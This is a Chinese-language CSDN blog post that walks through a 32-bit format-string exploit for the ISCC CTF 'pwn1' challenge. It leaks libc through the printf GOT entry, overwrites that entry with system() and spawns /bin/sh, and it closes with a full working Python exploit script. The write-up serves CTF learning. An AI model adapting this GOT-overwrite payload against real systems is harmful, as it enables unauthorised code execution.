@@ -1,0 +1,258 @@
+<div class="blog-content-box">
+ <div class="article-title-box">
+  <span class="article-type type-1 float-left">
+   原
+  </span>
+  <h1 class="title-article">
+   ISCC之pwn1格式化字符串漏洞详解！
+  </h1>
+ </div>
+ <div class="article-info-box">
+  <div class="article-bar-top d-flex">
+   <span class="time">
+    2017年05月29日 19:46:21
+   </span>
+   <div class="float-right">
+    <span class="read-count">
+     阅读数：893
+    </span>
+   </div>
+  </div>
+ </div>
+ <article>
+  <div class="article_content clearfix csdn-tracking-statistics" data-dsm="post" data-mod="popu_307" data-pid="blog" id="article_content">
+   <link href="https://csdnimg.cn/release/phoenix/template/css/htmledit_views-0a60691e80.css" rel="stylesheet"/>
+   <div class="htmledit_views">
+    <p>
+     <br/>
+     <em>
+      <strong>
+       作为小白的我，自从入了ctf的坑就再也没爬起来过，从无到有实在是很辛苦。仅以此片纪念我的青春。
+       <img alt="奋斗" src="http://static.blog.csdn.net/xheditor/xheditor_emot/default/struggle.gif"/>
+      </strong>
+     </em>
+    </p>
+    <p>
+    </p>
+    <p>
+     直接进入正题。这是个很明显的32位的格式化字符串漏洞。
+    </p>
+    <p>
+     <img alt="" src="https://img-blog.csdn.net/20170529195404790?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"/>
+     <br/>
+    </p>
+    <p>
+     <br/>
+    </p>
+    <p>
+     上手就先leak出libc地址，求偏移得到system地址，(我也忘了有没有给lib库，反正我是在本地调试，拿自己的lib库。Ps:在本地可以通过./libc.so.6或者ldd --version 查看libc的版本号，作为新手还是上两张图吧。)
+    </p>
+    <p>
+    </p>
+    <p>
+     <img alt="" src="https://img-blog.csdn.net/20170529195433165?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"/>
+    </p>
+    <p>
+     <img alt="" src="https://img-blog.csdn.net/20170529195438012?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"/>
+     <br/>
+    </p>
+    <p>
+     可以看到我的是2.19，注意下路径
+    </p>
+    <p>
+     <img alt="" src="https://img-blog.csdn.net/20170529195443696?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"/>
+     <br/>
+    </p>
+    <p>
+     <br/>
+    </p>
+    <p>
+     至于什么是格式化字符串漏洞，大家可以参考这篇文章
+     <a href="http://www.sohu.com/a/130725162_472906">
+      http://www.sohu.com/a/130725162_472906
+     </a>
+     很值得学习。
+    </p>
+    <p>
+     另外观察代码可以发现，没有return，也就没办法控制返回地址。对于格式化漏洞来说，难点在于怎么写，往哪写？读地址很容易，写地址会难一点。可能需要考虑缓冲区的问题，分几次写，每次写多少字节，这都需要自己去总结经验。一般来说建议先写一个字节在写两个字节(这是32位的题目哦，对于64位的题情况会略有不同，话说我还没做过64位的格式化字符串呢，不过大差不差啦。)。多试错。
+    </p>
+    <p>
+     还是上图吧！
+    </p>
+    <p>
+     <img alt="" src="https://img-blog.csdn.net/20170529195448278?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"/>
+    </p>
+    <p>
+     这是调试的代码。我先往bss中写，便于观察！！
+    </p>
+    <p>
+     <img alt="" src="https://img-blog.csdn.net/20170529195452556?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"/>
+    </p>
+    <p>
+     注意小端对齐（逆过来看）!通常来说l动态链接的地址都是以b7打头，因此我们只需要覆盖后三个字节即可。接下来复写got表地址
+    </p>
+    <p>
+    </p>
+    <p>
+     <img alt="" src="https://img-blog.csdn.net/20170529195457419?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"/>
+    </p>
+    <p>
+     <img alt="" src="https://img-blog.csdn.net/20170529195501790?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"/>
+     <br/>
+    </p>
+    <p>
+     可以看到已经成功覆盖了printf的got表，这也就意味着，当我们再调用printf这个函数时程序会执行system函数，这个程序的进程流也就被我们给劫持了。
+    </p>
+    <p>
+     那么问题来了。怎么才能在执行system(“/bin/sh”)[这是打开一个终端的意思，get shell]
+    </p>
+    <p>
+     刚开始我也没啥思路，管它呢，先试试再说！！！
+    </p>
+    <p>
+     咦！跟原来想象的有点不一样啊！
+    </p>
+    <p>
+     本来不想贴过程的。不过写这篇文章的目的是为了给小白看的。于是贴上过程。
+    </p>
+    <p>
+     <img alt="" src="https://img-blog.csdn.net/20170529195505654?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"/>
+    </p>
+    <p>
+     从这里可以看出来下一个system的参数是”plzi nput$”.这是不可避免的，那么接下来会发生什么呢！？会不会直接退出呢！？
+    </p>
+    <p>
+     <img alt="" src="https://img-blog.csdn.net/20170529195509977?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"/>
+    </p>
+    <p>
+     当调用printf时警告，意思就是要跳到一个非法的地址(因为被我们给劫持了)。OK！
+    </p>
+    <p>
+     <img alt="" src="https://img-blog.csdn.net/20170529195514873?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"/>
+    </p>
+    <p>
+     来到这。一直F8………直到天荒地老。。。。。。
+    </p>
+    <p>
+     <img alt="" src="https://img-blog.csdn.net/20170529195519212?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"/>
+    </p>
+    <p>
+     咦！什么都没有发生？正常返回了。来看看输出。
+    </p>
+    <p>
+     <img alt="" src="https://img-blog.csdn.net/20170529195523498?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"/>
+    </p>
+    <p>
+     哦。原来system(“plzi nput$”)什么也不会发生，只是没有打印出来而已。那么我就放心了。只要程序在这里不宕，那么下一次调用的时候我就可以控制它的参数。
+    </p>
+    <p>
+     <img alt="" src="https://img-blog.csdn.net/20170529195528196?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"/>
+    </p>
+    <p>
+     在这看到了吗，这个format我们可以控制，接下来就很明显了！执行system时栈上的地址
+    </p>
+    <p>
+     <img alt="" src="https://img-blog.csdn.net/20170529195534951?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"/>
+    </p>
+    <p>
+     <img alt="" src="https://img-blog.csdn.net/20170529195540040?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"/>
+     <br/>
+    </p>
+    <p>
+    </p>
+    <p>
+     黑暗渐渐逝去，即将迎来光明！
+    </p>
+    <p>
+     <img alt="" src="https://img-blog.csdn.net/20170529195545186?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"/>
+    </p>
+    <p>
+     好。我们已经成功攻破了自己的电脑。比赛的时候要注意，libc的不同会导致偏移不同，得看具体的环境了。
+    </p>
+    <p>
+     已经写得很详细了，虽然简单但对于，没有接触过的新手来说，也还是有难度的。主要难度还是在写地址那一块吧！很难讲，自己多尝试，可以试着每次写一个字节，或者一次写三个字节，或者先写两个字节再写一个字节，总之在尝试的过程中会遇到很多的问题。我就不一一列举了！
+    </p>
+    <p>
+     最后感谢司！我万能的..heihei
+     <img alt="鄙视" src="http://static.blog.csdn.net/xheditor/xheditor_emot/default/despise.gif"/>
+    </p>
+    <p>
+     最后的最后贴上完整payload。
+    </p>
+    <br/>
+    <p>
+    </p>
+    <pre class="python">from zio import *
+import time
+import struct
+target=('127.0.0.1',10000)
+#target=('115.28.185.220',1111)
+io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))
+c2=raw_input('go1?')
+io.read_until('plz input$')
+io.writeline('1')
+io.read_until('please input your name:')
+payload='%7$s'+l32(0x0804a010)#printf_got
+io.writeline(payload)
+test=io.read_until('\xb7')
+printf_libc=struct.unpack('&lt;I',test[-4:])[0]
+print hex(printf_libc)
+system_libc=printf_libc-0xD100
+bin_=printf_libc+0x11343C
+print hex(system_libc)
+print hex(bin_)
+io.read_until('plz input$')
+io.writeline('1')
+io.read_until('please input your name:')
+payload=l32(0x0804a010)+l32(0x0804a010+0x1)
+len1=(system_libc &amp; 0x000000ff) -0x8
+len2=((system_libc % 0x1000000) &gt;&gt; 8) - len1 - 0x8
+payload+='%'+str(len1) + 'x%6$hhn'
+payload+='%'+str(len2) + 'x%7$hn'
+io.writeline(payload)
+io.read_until('2.heiheihei')
+io.writeline('1')
+io.read_until('please input your name:')
+io.writeline('/bin/sh\x00')
+io.interact()
+</pre>
+   </div>
+  </div>
+  <div class="hide-article-box text-center csdn-tracking-statistics tracking-click" data-mod="popu_376">
+   <a class="btn btn-red-hollow" id="btn-readmore">
+    阅读更多
+   </a>
+  </div>
+ </article>
+ <div class="article-bar-bottom">
+  <div class="article-copyright">
+   版权声明：本文为博主原创文章，未经博主允许不得转载。			https://blog.csdn.net/qq_33438733/article/details/72803627
+  </div>
+  <div class="tags-box artic-tag-box">
+   <span class="label">
+    文章标签：
+   </span>
+   <a class="tag-link" href="http://so.csdn.net/so/search/s.do?q=格式化&amp;t=blog" target="_blank">
+    格式化
+   </a>
+   <a class="tag-link" href="http://so.csdn.net/so/search/s.do?q=漏洞&amp;t=blog" target="_blank">
+    漏洞
+   </a>
+   <a class="tag-link" href="http://so.csdn.net/so/search/s.do?q=PWN&amp;t=blog" target="_blank">
+    PWN
+   </a>
+  </div>
+  <div class="tags-box">
+   <span class="label">
+    个人分类：
+   </span>
+   <a class="tag-link" href="https://blog.csdn.net/qq_33438733/article/category/6925810" target="_blank">
+    PWN
+   </a>
+   <a class="tag-link" href="https://blog.csdn.net/qq_33438733/article/category/6945018" target="_blank">
+    CTF
+   </a>
+  </div>
+ </div>
+ <!-- !empty($pre_next_article[0]) -->
+</div>
